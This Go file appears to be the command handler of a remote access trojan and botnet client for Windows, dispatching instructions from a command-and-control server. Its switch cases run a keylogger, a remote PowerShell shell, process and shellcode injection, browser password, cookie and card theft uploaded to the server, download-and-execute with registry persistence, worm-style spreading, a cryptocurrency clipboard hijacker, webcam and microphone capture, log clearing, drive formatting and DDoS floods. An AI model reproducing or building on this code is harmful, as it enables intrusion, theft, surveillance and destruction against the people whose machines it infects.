package core

import (
	"bytes"
	"encoding/json"
	"golang.org/x/sys/windows/registry"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

//id = SQL Row id
//dat = Command Caller
//parameters = Command Parameters

func HandleCommands(id string, dat string, parameters string) {
	switch dat {
	case "0xKEY": //Keylogger
		go CommandUpdateC2(id, "Issued")
		settings := strings.Split(parameters, "|")
		if settings[0] == "END" { //Stop the Keylogger
			KeyloggerState = false
			Log = ""
			go CommandUpdateC2(id, "Finished")
		} else if settings[0] == "START" { //Start Basic Logger

		}
	case "0xFILE": //File Browser
		go CommandUpdateC2(id, "Issued")
		settings := strings.Split(parameters, "|")
		if settings[0] == "dir" { //List Dir
			fileExplorer, err := ExploreDirectory(settings[1])
			if err != nil {
				go FileBrowser("0|" + err.Error())
			} else {
				explorerBytes, _ := json.Marshal(fileExplorer)
				go FileBrowser("1|" + string(explorerBytes))
			}
		} else if settings[0] == "get" { //Upload to C2

		} else if settings[0] == "new" { //Create new file

		}
	case "0xRSHELL": //RemoteShell
		go CommandUpdateC2(id, "Issued...")
		out := IssuePowershell(parameters)
		go Respond(out)
		go CommandUpdateC2(id, "Finished")
	case "0xREFRESH": //Refresh Info
		go CommandUpdateC2(id, "Issued...")
		err := UpdateSettings()
		if err {
			go CommandUpdateC2(id, "Finished")
		} else {
			go CommandUpdateC2(id, "Failed")
		}
	case "0xREMO": //Remote Desktop Injection
		go CommandUpdateC2(id, "Issued...")
		settings := strings.Split(parameters, "|")
		if settings[0] == "hVNC" { //hVNC Client
			n := RandomString(15)
			err := CreateFileAndWriteData(os.Getenv("APPDATA")+"\\"+n+".dat", []byte(Base64Decode(HVNCData)))
			if err != nil {
				go CommandUpdateC2(id, "Failed")
			}
			_, Finished := ExternalRunPE(os.Getenv("APPDATA")+"\\"+n+".dat", "C:\\Windows\\explorer.exe", "")
			if Finished {
				go CommandUpdateC2(id, "Finished")
			} else {
				go CommandUpdateC2(id, "Failed")
			}
		} else if settings[0] == "RDP" { //RDP Client BROKEN NEED TO FIGURE OUT WHAT TO INJECT THE .NET PROGRAM INTO
			//err := CreateFileAndWriteData(os.Getenv("APPDATA")+"\\"+"tiens.dat", []byte(Base64Encode(settings[1]+"|"+settings[2])))
			//if err != nil {
			//	go CommandUpdateC2(id, "Failed")
			//	}
			//Finished := InternalRunPE([]byte(Base64Decode(RPDData)))
			//if Finished {
			//	go CommandUpdateC2(id, "Finished")
			//	} else {
			//		go CommandUpdateC2(id, "Failed")
			//	}
		}
	case "0xSHELL": //Run Shellcode
		go CommandUpdateC2(id, "Issued...")
		settings := strings.Split(parameters, "|")
		if settings[0] == "0" { //InjectIntoProcess
			Finished := InjectIntoProcess(settings[1], settings[2], settings[3])
			if Finished {
				go CommandUpdateC2(id, "Finished")
			} else {
				go CommandUpdateC2(id, "Failed")
			}
		} else if settings[0] == "1" { //InjectIntoProcessEarlyBird
			Finished := InjectIntoProcessEarlyBird(settings[1], settings[2], settings[3])
			if Finished {
				go CommandUpdateC2(id, "Finished")
			} else {
				go CommandUpdateC2(id, "Failed")
			}
		} else if settings[0] == "2" { //SyscallInjectShellcode
			Finished := SyscallInjectShellcode(settings[1])
			if Finished {
				go CommandUpdateC2(id, "Finished")
			} else {
				go CommandUpdateC2(id, "Failed")
			}
		} else if settings[0] == "3" { //CreateThreadInject
			Finished := CreateThreadInject(settings[1])
			if Finished {
				go CommandUpdateC2(id, "Finished")
			} else {
				go CommandUpdateC2(id, "Failed")
			}
		}
	case "0xMETER": //Meterpreter
		go CommandUpdateC2(id, "Issued...")
		settings := strings.Split(parameters, "|")
		state := Meterpreter(settings[0], settings[1])
		if state {
			go CommandUpdateC2(id, "Finished")
		} else {
			go CommandUpdateC2(id, "Failed")
		}
	case "0xSOCKS": //Socks5
		go CommandUpdateC2(id, "Issued...")
		if Socks5State {
			Socks5State = false
			go CommandUpdateC2(id, "Finished")
		} else {
			Socks5State = true
			go StartSocks5(parameters)
			go CommandUpdateC2(id, "Executed...")
		}
	case "0xPASS": //Get Logins, Cookies, CC's, History, Bookmarks, Keys, Etc...
		//TODO: Make it use a random folder name
		go CommandUpdateC2(id, "Issued...")
		//Get Browser data
		Browsers = PickBrowser("all")
		_ = MakeDir(os.Getenv("APPDATA") + "\\tmpResults\\")
		for _, browser := range Browsers {
			_ = browser.InitSecretKey()
			items, _ := browser.GetAllItems()
			name := browser.GetName()
			key := browser.GetSecretKey()
			for _, item := range items {
				_ = item.CopyDB()
				switch browser.(type) {
				case *Chromium:
					_ = item.ChromeParse(key)
				case *Firefox:
					_ = item.FirefoxParse()
				}
				_ = item.Release()
				_ = item.OutPut("json", name, os.Getenv("APPDATA")+"\\tmpResults\\")
			}
		}
		//Get Other stuff
		go GetWindows()
		go SearchAndSteal()
		go GetOthers()
		//Sleep while functions are run
		time.Sleep(60 * time.Second)
		//Compress files to a Zip
		err := CompressZIP(os.Getenv("APPDATA")+"\\tmpResults\\", os.Getenv("APPDATA")+"\\"+MyID+".zip")
		if err != nil {
			if id != "X" {
				go CommandUpdateC2(id, "Zip Error")
			}
		} else {
			_ = os.RemoveAll(os.Getenv("APPDATA") + "\\tmpResults\\")
			go UploadFile("0", os.Getenv("APPDATA")+"\\"+MyID+".zip")
			go UpdatePassCounts()
			if id != "X" {
				go CommandUpdateC2(id, "Finished")
			}
		}
	case "0xCSLOGS": //Clear System Logs
		go CommandUpdateC2(id, "Issued...")
		Finished := ClearSystemLogs()
		if Finished {
			go CommandUpdateC2(id, "Finished")
		} else {
			go CommandUpdateC2(id, "Failed")
		}
	case "0xFMTC": //Format C:\
		go CommandUpdateC2(id, "Executed...")
		time.Sleep(10 * time.Second)
		go FormatDrive("C")
	case "0xWiFi": //Disconnect WiFi
		go CommandUpdateC2(id, "Executed...")
		time.Sleep(10 * time.Second)
		go WiFiDisconnect()
	case "0xDDOS": //DDOS Control STATE|MODE|THREADS|TARGET|INTERVAL|LENGTH
		go CommandUpdateC2(id, "Issued...")
		settings := strings.Split(parameters, "|")
		if settings[0] == "true" {
			var Threads, Interval, Length int
			Threads, _ = strconv.Atoi(settings[2])
			Interval, _ = strconv.Atoi(settings[4])
			Length, _ = strconv.Atoi(settings[5])
			if settings[1] == "0" { //TCP Attack
				for i := 0; i < Threads; i++ {
					go TCPAttack(settings[3], Interval)
				}
			} else if settings[1] == "1" { //UDP Attack
				for i := 0; i < Threads; i++ {
					go UDPAttack(settings[3], Interval)
				}
			} else if settings[1] == "2" { //HulkAttack
				values := strings.Split(parameters, "*")
				for i := 0; i < Threads; i++ {
					go HulkAttack(values[0], values[1], Interval)
				}
			} else if settings[1] == "3" { //GoldenEye
				for i := 0; i < Threads; i++ {
					go GoldenEyeAttack(settings[3], Interval)
				}
			} else if settings[1] == "4" { //HTTP Get
				for i := 0; i < Threads; i++ {
					go HTTPGetAttack(settings[3], Interval)
				}
			} else if settings[1] == "5" { //ACE
				for i := 0; i < Threads; i++ {
					go ACEAttack(settings[3], Interval)
				}
			} else if settings[1] == "6" { //SYNFlood
				Host := strings.Split(settings[3], ":")
				Port, _ := strconv.Atoi(Host[1])
				_ = SYNFlood(Host[0], Port, 100, Threads)
			}
			DDoSEnabled = true
			go DDOSTimer(Length)
			go CommandUpdateC2(id, "Executed...")
		} else {
			DDoSEnabled = false
			go CommandUpdateC2(id, "Finished")
		}
	case "0xIMG": //Update Images
		go CommandUpdateC2(id, "Issued...")
		if strings.Contains(parameters, "screenshot") {
			go ImagesC2(false, false)
			go CommandUpdateC2(id, "Finished")
		} else if strings.Contains(parameters, "webcam") {
			go ImagesC2(true, false)
			go CommandUpdateC2(id, "Finished")
		}
	case "0xKC": //Kill Client
		go CommandUpdateC2(id, "Issued...")
		go CommandUpdateC2(id, "Executed...")
		time.Sleep(10 * time.Second)
		os.Exit(22)
	case "0xUNC": //Uninstall Client
		go CommandUpdateC2(id, "Issued...")
		go CommandUpdateC2(id, "Executed...")
		go UserKitUninstall()
	case "0xUCxP": //Update Client
		go CommandUpdateC2(id, "Issued...")

	case "0xSEED": //SEED Torrent
		go CommandUpdateC2(id, "Issued...")
		go ExternalSeeder(parameters)
		go CommandUpdateC2(id, "Executed...")
	case "0xSLEEP": //Have Client Sleep, No Connections for X time * Minute
		go CommandUpdateC2(id, "Executed...")
		i, err := strconv.Atoi(parameters)
		if err == nil {
			go AlarmClock(i)
		}
		ClientSleeping = true
	case "0xOUxPH": //Open URL
		go CommandUpdateC2(id, "Issued...")
		dat := strings.Split(parameters, "|")
		if dat[1] == "true" { //Open Hidden
			rsp, err := http.Get(dat[0])
			if err != nil {
				go CommandUpdateC2(id, "Failed")
			} else {
				defer rsp.Body.Close()
				go CommandUpdateC2(id, "Finished")
			}
		} else if dat[1] == "false" {
			_ = IssuePowershell("start " + dat[0])
			go CommandUpdateC2(id, "Finished")
		}
	case "0xSPxPH": //Start Process
		go CommandUpdateC2(id, "Issued...")
		dat := strings.Split(parameters, "|")
		if dat[5] == "true" { //Open Hidden
			var attr os.ProcAttr
			attr.Sys.HideWindow = true
			_, err := os.StartProcess(dat[0], nil, &attr)
			if err != nil {
				go CommandUpdateC2(id, "Failed")
			} else {
				go CommandUpdateC2(id, "Finished")
			}
		} else if dat[5] == "false" {
			_ = IssuePowershell("start " + dat[0])
			go CommandUpdateC2(id, "Finished")
		}
	case "0xDR": //Download and Run
		go CommandUpdateC2(id, "Issued...")
		dat := strings.Split(parameters, "|")
		if dat[1] == "true" { //Use Startup dat[2] = Startup Path
			n := RandomString(15)
			output, err := os.Create(os.Getenv("APPDATA") + "\\" + n + ".exe")
			if err != nil {
				go CommandUpdateC2(id, "Failed")
			} else {
				defer output.Close()
				response, err := http.Get(dat[0])
				if err != nil {
					go CommandUpdateC2(id, "Failed")
				} else {
					defer response.Body.Close()
					_, err := io.Copy(output, response.Body)
					if err != nil {
						go CommandUpdateC2(id, "Failed")
					}
					_ = RemoveZoneIdentifier(os.Getenv("APPDATA") + "\\" + n + ".exe")
					_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", n, os.Getenv("APPDATA")+"\\"+n+".exe")
					Command := os.Getenv("APPDATA") + "\\" + n + ".exe"
					Exec := exec.Command("cmd", "/C", Command)
					Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					err = Exec.Start()
					if err != nil {
						go CommandUpdateC2(id, "Failed")
					}
					go CommandUpdateC2(id, "Finished")
				}
			}
		} else if dat[1] == "false" {
			if dat[3] == "true" { //RunPE dat[4] = RunPE Host
				response, err := http.Get(dat[0])
				if err != nil {
					go CommandUpdateC2(id, "Failed")
				} else {
					defer response.Body.Close()
					buf := new(bytes.Buffer)
					_, err = buf.ReadFrom(response.Body)
					if err != nil {
						go CommandUpdateC2(id, "Failed")
					}
					Finished := ReflectiveRunPE(buf.Bytes())
					if Finished {
						go CommandUpdateC2(id, "Finished")
					} else {
						go CommandUpdateC2(id, "Failed")
					}
				}
			} else if dat[1] == "false" { //Download and Run Only
				n := RandomString(15)
				output, err := os.Create(os.Getenv("APPDATA") + "\\" + n + ".exe")
				if err != nil {
					go CommandUpdateC2(id, "Failed")
				} else {
					defer output.Close()
					response, err := http.Get(dat[0])
					if err != nil {
						go CommandUpdateC2(id, "Failed")
					} else {
						defer response.Body.Close()
						_, err := io.Copy(output, response.Body)
						if err != nil {
							go CommandUpdateC2(id, "Failed")
						}
						_ = RemoveZoneIdentifier(os.Getenv("APPDATA") + "\\" + n + ".exe")
						Command := os.Getenv("APPDATA") + "\\" + n + ".exe"
						Exec := exec.Command("cmd", "/C", Command)
						Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
						err = Exec.Start()
						if err != nil {
							go CommandUpdateC2(id, "Failed")
						}
						go CommandUpdateC2(id, "Finished")
					}
				}
			}
		}
	case "0xSPREAD": //Cloud File Spreader and Drive Infection
		go CommandUpdateC2(id, "Issued...")
		go CloudServiceSpread(SpreadFileNames[rand.Intn(len(SpreadFileNames))] + ".exe")
		go FileShareSpread(SpreadFileNames[rand.Intn(len(SpreadFileNames))] + ".exe")
		go DriveInfect()
		go CommandUpdateC2(id, "Finished")
	case "0xDOCX": //Docx Injector
		go CommandUpdateC2(id, "Issued...")
		paths := []string{"Desktop", "Documents", "Downloads"}
		Finished := DocxInjector(paths, parameters)
		if Finished {
			go CommandUpdateC2(id, "Finished")
		} else {
			go CommandUpdateC2(id, "Failed")
		}
	case "0xMSG": //MessageBox
		go CommandUpdateC2(id, "Issued...")
		dat := strings.Split(parameters, "|")
		if dat[0] == "Exclamation" {
			MessageBox(dat[1], dat[2], 0x00000030)
		} else if dat[0] == "Warning" {
			MessageBox(dat[1], dat[2], 0x00000030)
		} else if dat[0] == "Information" {
			MessageBox(dat[1], dat[2], 0x00000040)
		} else if dat[0] == "Error" {
			MessageBox(dat[1], dat[2], 0x00000010)
		} else if dat[0] == "None" {
			MessageBox(dat[1], dat[2], 0x00000000)
		}
		go CommandUpdateC2(id, "Finished")
	case "0xCLIP": //Update Clipper
		go CommandUpdateC2(id, "Issued...")
		settings := strings.Split(parameters, "|")
		if ClipperState {
			ClipperState = false
			go CommandUpdateC2(id, "Finished")
		} else {
			ClipperState = true
			BTC = settings[1]
			XMR = settings[2]
			ETH = settings[3]
			Custom = settings[4]
			CustomRegex = settings[5]
			go ClipperLoop()
			go CommandUpdateC2(id, "Finished")
		}
	case "0xRR": //RickRoll
		go CommandUpdateC2(id, "Issued...")
		_ = IssuePowershell("start https://www.youtube.com/watch?v=HIcSWuKMwOw")
		go CommandUpdateC2(id, "Finished")
	case "0xGS": // Gandalf Sax
		go CommandUpdateC2(id, "Issued...")
		_ = IssuePowershell("start https://www.youtube.com/watch?v=G1IbRujko-A")
		go CommandUpdateC2(id, "Finished")
	case "0xSB": //Spooky Background
		go CommandUpdateC2(id, "Issued...")
		n := RandomString(5)
		output, err := os.Create(os.Getenv("APPDATA") + n + ".jpg")
		if err != nil {
			go CommandUpdateC2(id, "Failed")
		} else {
			defer output.Close()
			response, err := http.Get("https://i.imgur.com/lc32mo5.png")
			if err != nil {
				go CommandUpdateC2(id, "Failed")
			} else {
				defer response.Body.Close()
				_, _ = io.Copy(output, response.Body)
				SetWallpaper(os.Getenv("APPDATA") + n + ".jpg")
				go CommandUpdateC2(id, "Finished")
			}
		}
	case "0xWP": //Set Wallpaper
		go CommandUpdateC2(id, "Issued...")
		n := RandomString(5)
		output, err := os.Create(os.Getenv("APPDATA") + n + ".jpg")
		if err != nil {
			go CommandUpdateC2(id, "Failed")
		} else {
			defer output.Close()
			response, err := http.Get(parameters)
			if err != nil {
				go CommandUpdateC2(id, "Failed")
			} else {
				defer response.Body.Close()
				_, err = io.Copy(output, response.Body)
				if err != nil {
					go CommandUpdateC2(id, "Failed")
				} else {
					SetWallpaper(os.Getenv("APPDATA") + n + ".jpg")
					go CommandUpdateC2(id, "Finished")
				}
			}
		}
	case "0xFB": //Fork Bomb
		go CommandUpdateC2(id, "Executed...")
		time.Sleep(5 * time.Second)
		go ForkBomb()
	case "0xB2B": //Boot2Blue

	case "0xHOST": //Edit Host File
		go CommandUpdateC2(id, "Issued...")
		Finished := EditHosts(parameters)
		if Finished {
			go CommandUpdateC2(id, "Finished")
		} else {
			go CommandUpdateC2(id, "Failed")
		}
	case "0xMSI": //Silent MSI Install
		go CommandUpdateC2(id, "Issued...")
		Finished := SilentInstall(parameters, false)
		if Finished {
			go CommandUpdateC2(id, "Finished")
		} else {
			go CommandUpdateC2(id, "Failed")
		}
	case "0xNET": //Silent .NET Install
		go CommandUpdateC2(id, "Issued...")
		Finished := SilentInstall("http://download.microsoft.com/download/9/5/A/95A9616B-7A37-4AF6-BC36-D6EA96C8DAAE/dotNetFx40_Full_x86_x64.exe", true)
		if Finished {
			go CommandUpdateC2(id, "Finished")
		} else {
			go CommandUpdateC2(id, "Failed")
		}
	case "0xDROP": //Drop file to host
		settings := strings.Split(parameters, "|")
		go CommandUpdateC2(id, "Issued...")
		Finished := DropFile(settings[0], settings[1], settings[2], settings[3])
		if Finished {
			go CommandUpdateC2(id, "Finished")
		} else {
			go CommandUpdateC2(id, "Failed")
		}
	case "0xBSOD": //Trigger BSOD
		go CommandUpdateC2(id, "Executed...")
		time.Sleep(5 * time.Second)
		TriggerBSOD()
	case "0xREC": //Record Audio
		settings := strings.Split(parameters, "|")
		go CommandUpdateC2(id, "Issued...")
		Finished := RecordAudio(settings[0], settings[1])
		if Finished {
			go UploadFile("2", "mic.wav")
			go CommandUpdateC2(id, "Finished")
		} else {
			go CommandUpdateC2(id, "Failed")
		}
	case "0xPRCMD": //Persistent Command
		go CommandUpdateC2(id, "Issued...")
		if AdminState {
			CreatePersistentCommand(parameters)
			go CommandUpdateC2(id, "Finished")
		} else {
			go CommandUpdateC2(id, "Failed")
		}
	case "0xCPU": //Load CPU
		go CommandUpdateC2(id, "Executed...")
		go CPULoader(runtime.NumCPU(), "1", 100)
	case "OxPS": //Powershell Scripting
		go CommandUpdateC2(id, "Issued...")
		_ = Scripter(RandomString(15), Base64Decode(parameters), 0)
		go CommandUpdateC2(id, "Finished")
	case "OxWSH": //Windows Scripting Host Scripting
		go CommandUpdateC2(id, "Issued...")
		_ = Scripter(RandomString(15), Base64Decode(parameters), 2)
		go CommandUpdateC2(id, "Finished")
	case "OxJS": //Javascript Scripting
		go CommandUpdateC2(id, "Issued...")
		_ = Scripter(RandomString(15), Base64Decode(parameters), 3)
		go CommandUpdateC2(id, "Finished")
	case "OxVB": //VBScript Scripting
		go CommandUpdateC2(id, "Issued...")
		_ = Scripter(RandomString(15), Base64Decode(parameters), 1)
		go CommandUpdateC2(id, "Finished")
	case "OxBAT": //Batch Scripting
		go CommandUpdateC2(id, "Issued...")
		_ = Scripter(RandomString(15), Base64Decode(parameters), 4)
		go CommandUpdateC2(id, "Finished")
	case "0xS": //Shutdown
		//Add timed support
		go CommandUpdateC2(id, "Executed...")
		time.Sleep(10 * time.Second)
		_ = IssuePowershell("shutdown -s -t 00")
	case "0xr": //Restart
		//Add timed support
		go CommandUpdateC2(id, "Executed...")
		time.Sleep(10 * time.Second)
		_ = IssuePowershell("shutdown -r -t 00")
	case "0xL": //Lock
		//Add timed support
		go CommandUpdateC2(id, "Executed...")
		time.Sleep(10 * time.Second)
		_ = IssuePowershell("shutdown -l -t 00")
	}
}
